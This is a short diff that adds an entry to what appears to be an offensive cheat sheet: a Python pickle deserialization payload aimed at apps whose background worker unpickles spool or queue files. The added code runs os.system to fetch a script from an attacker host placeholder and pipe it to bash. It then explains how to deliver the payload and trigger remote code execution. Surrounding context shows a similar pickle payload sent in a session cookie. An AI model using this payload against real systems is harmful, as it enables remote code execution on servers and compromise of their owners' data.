@@ -33,3 +33,16 @@ print(base64.b64encode(pickle.dumps(Exploit())).decode())
 curl -H 'Cookie: session_data=<encoded-pickle>' http://<TARGET>
 ```
 
+Python pickle via spool/queue file — if an app writes user-controlled data to a spool directory and a worker deserializes it:
+```python
+import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('curl http://<LHOST>/<shell> | bash',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+# deliver: upload filename or parameter that becomes spool entry path/content
+```
+Trigger: once the spool file lands, the background worker unpickles it → RCE.
+
